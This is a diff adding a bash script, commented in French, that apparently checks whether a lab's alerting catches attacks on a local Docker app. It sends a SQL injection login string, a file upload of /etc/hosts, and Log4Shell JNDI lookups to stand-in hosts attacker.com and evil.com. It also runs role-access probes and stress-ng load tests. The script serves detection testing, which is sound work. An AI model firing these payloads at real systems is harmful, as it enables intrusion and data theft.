@@ -1,0 +1,141 @@
+#!/bin/bash
+
+#############################
+#    Définition des tests   #
+#############################
+
+# Noms des tests
+test_sqli_name="SQL Injection (CVE-2000-1209)"
+test_struts_name="Apache Struts2 (CVE-2017-5638)"
+test_log4shell_name="Log4Shell (CVE-2021-44228)"
+test_roles_name="Accès autorisés et non autorisés (Roles)"
+test_stress_cpu_name="Stress-ng - CPU Load"
+test_stress_ram_name="Stress-ng - RAM/VM Load"
+test_stress_io_name="Stress-ng - HDD/IO Load"
+
+# Fonctions des tests
+# Note : J'utilise 'docker compose exec curl' comme dans tes commandes. 
+# Assure-toi d'être dans le bon répertoire où se trouve ton docker-compose.yml.
+
+test_sqli () {
+    docker compose exec curl curl -s "http://server-app/login?user=admin&pass=%27%20OR%201%3D1"
+}
+
+test_struts () {
+    docker compose exec curl curl -s -X POST -H "Content-Type: multipart/form-data" -F "file=@/etc/hosts" http://server-app/
+}
+
+test_log4shell () {
+    echo "--- Envoi JNDI via Query String ---"
+    docker compose exec curl curl -s "http://server-app/search?q=\${jndi:ldap://attacker.com/Monsieur_On_veut_20_Sur_20}"
+    echo "--- Envoi JNDI via User-Agent ---"
+    docker compose exec curl curl -s -v -H "User-Agent: \${jndi:ldap://evil.com/Coucou_C_est_Moi}" "http://server-app/"
+}
+
+test_roles () {
+    echo "--- Tests Employee ---"
+    docker compose exec curl curl -u employee:employee http://server-app/employee
+    docker compose exec curl curl -u employee:employee http://server-app/user
+    docker compose exec curl curl -u employee:employee http://server-app/admin # Devrait alerter
+    
+    echo "--- Tests Admin ---"
+    docker compose exec curl curl -u admin:admin http://server-app/employee
+    docker compose exec curl curl -u admin:admin http://server-app/user
+    docker compose exec curl curl -u admin:admin http://server-app/admin
+    
+    echo "--- Tests User ---"
+    docker compose exec curl curl -u user:user http://server-app/user
+    docker compose exec curl curl -u user:user http://server-app/employee # Devrait alerter
+    docker compose exec curl curl -u user:user http://server-app/admin    # Devrait alerter
+}
+
+test_stress_cpu () {
+    docker compose exec stress stress-ng --cpu 8 --timeout 30 --metrics-brief
+}
+
+test_stress_ram () {
+    docker compose exec stress stress-ng --vm 4 --vm-bytes 512M --timeout 30 --metrics-brief
+    docker compose exec stress stress-ng --vm 2 --vm-bytes 80% --timeout 30 --metrics-brief
+}
+
+test_stress_io () {
+    docker compose exec stress stress-ng --hdd 4 --hdd-write --timeout 30 --metrics-brief
+}
+
+##############################
+#      Mode Interactif       #
+##############################
+
+if [ -z "$*" ]; then
+while true; do
+    options=(
+        "$test_sqli_name" 
+        "$test_struts_name" 
+        "$test_log4shell_name" 
+        "$test_roles_name" 
+        "$test_stress_cpu_name" 
+        "$test_stress_ram_name" 
+        "$test_stress_io_name" 
+        "TOUT LANCER (Attaques + Stress)" 
+        "Quitter"
+    )
+
+    clear
+    echo "   _____                      _ _         "
+    echo "  / ____|                    (_) |        "
+    echo " | (___   ___  ___ _   _ _ __ _| |_ _   _ "
+    echo "  \___ \ / _ \/ __| | | | '__| | __| | | |"
+    echo "  ____) |  __/ (__| |_| | |  | | |_| |_| |"
+    echo " |_____/ \___|\___|\__,_|_|  |_|\__|\__, |"
+    echo "                                     __/ |"
+    echo "                                    |___/ "
+    echo "Security Test Suite - Simulation d'attaques"
+    echo ""
+
+    select opt in "${options[@]}"; do
+        case $REPLY in
+            1) test_sqli; break ;;
+            2) test_struts; break ;;
+            3) test_log4shell; break ;;
+            4) test_roles; break ;;
+            5) test_stress_cpu; break ;;
+            6) test_stress_ram; break ;;
+            7) test_stress_io; break ;;
+            8) test_sqli; test_struts; test_log4shell; test_roles; test_stress_cpu; test_stress_ram; test_stress_io; break ;;
+            9) exit 0 ;;
+            *) echo "Option invalide !" >&2
+        esac
+    done
+    echo -e "\nTest terminé. Appuyez sur Entrée pour continuer..."
+    read
+done
+fi
+
+##############################
+#        Mode Script         #
+##############################
+
+for arg in "$@"
+do
+    case $arg in
+        -1) test_sqli ;;
+        -2) test_struts ;;
+        -3) test_log4shell ;;
+        -4) test_roles ;;
+        -5) test_stress_cpu ;;
+        -6) test_stress_ram ;;
+        -7) test_stress_io ;;
+        -99) test_sqli; test_struts; test_log4shell; test_roles; test_stress_cpu; test_stress_ram; test_stress_io ;;
+        --list|-l|--help|-h)
+            echo -e "\nTests disponibles :\n"
+            echo "  -1 : $test_sqli_name"
+            echo "  -2 : $test_struts_name"
+            echo "  -3 : $test_log4shell"
+            echo "  -4 : $test_roles_name"
+            echo "  -5 : $test_stress_cpu_name"
+            echo "  -6 : $test_stress_ram_name"
+            echo "  -7 : $test_stress_io_name"
+            echo "  -99: Lancer tout"
+            ;;
+    esac
+done
